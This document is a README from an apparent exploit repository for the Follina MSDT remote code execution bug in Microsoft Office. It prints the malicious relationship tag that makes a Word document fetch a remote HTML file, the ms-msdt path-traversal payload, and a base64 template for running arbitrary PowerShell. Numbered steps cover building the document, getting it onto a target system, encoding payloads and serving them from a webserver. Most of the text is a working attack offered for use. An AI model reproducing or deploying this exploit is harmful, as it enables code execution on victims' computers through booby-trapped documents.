# Microsoft Office RCE - “Follina” MSDT Attack 

This is a repository to hold files needed to recreate the Follina Attack. 

## How does Follina work? 

Take a word document and unzip it. (unzip file.doc) In the word/_rels/document.xml.rels document there are relationship tags used to get external links for items like font. You can add a relationship to have the document connect to your webserver, pull a file, and run it. 
```
<Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://LOCAL_IP:PORT/index.html!" TargetMode="External"/>
```
The Docoument included in this repo has this relationship tag added with a dummy IP that can be easily replaced for usage. 

Once you have the document calling back, you need to create an html file to carryout the exploit. 

The html document uses a script that uses MSDT to run powershell commands as the user that opened the word document. 

Here is the main section of the payload: 
```
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc)/.exe\""
```
This sample uses the exploit to open the calculator application. This version of the payload requires 

- At a minimum, two /../ directory traversals were required at the start of the IT_BrowseForFile parameter
- Code wrapped within $() would execute via PowerShell, but spaces would break it
- “.exe” must be the last trailing string present at the end of the IT_BrowseForFile parameter 
(This text was taken from John Hammonds Huntress Post which is linked at the end. )

There is another version of the payload which allows you to execute any powershell commands, but the command must be base64 encoded. Here is the payload for the same calc exploit using the base64 encoding. 
```
<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'Y2FsYw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; 
```
The base64 encoding of "calc" is 'Y2FsYw=='.  So to use this for any exploit the syntax would be
```
<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'BASE64_ENCODED_COMMAND'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; 
```
The index_template.html file has the exploit with a BASE64_ENCODED_COMMAND place holder to simplify things. 

The last part of the exploit is to fill it with random characters to meet the minimum of 4096 bytes to execute, and closing the script tag. 

When the user opens the document, the reference file calls for the index.html file from our webserver. It will then run the file, utilizing the msdt to run our payloads. 

## How can you use it? 

### Creating your own exploit. This is a two part process. 

Part One: creating the document. 
1. unzip the microsoft doc
2. Add relationship tag to the word/_rels/document.xml.rels file. (if you are using the template, just change the IP address to your local machine) 
3. re-zip the file into a .doc extension 
4. Get document onto the target system. Note: at time of writing gmail does detect this exploit and will not allow the file to be sent. 

Part Two: creating the html file.
1. Create a payload.txt file with powershell commands. If there are multiple commands separate with a ; and not a newline. 
2. base64 encode the file 
```
base64 -w 0 payload.txt
```
3. Copy and paste encoded payload into the index.html file between the char34 operators. 

```
'+[char]34+'BASE64_ENCODED_PAYLOAD_HERE'+[char]34+'
```
This is marked in the index_template.html file. 
4. Run a webserver in the same folder as the index.html file. You can use a python simple webserver 

```
python3 -m http.server PORT
```
This port must match the port put into the word document. 

### Using a Proof of Concept Script 
JohnHammond Premade Proof of Concept Code: https://github.com/JohnHammond/msdt-follina This code can be ran without any additional steps.  


## Further Reading 
https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug 
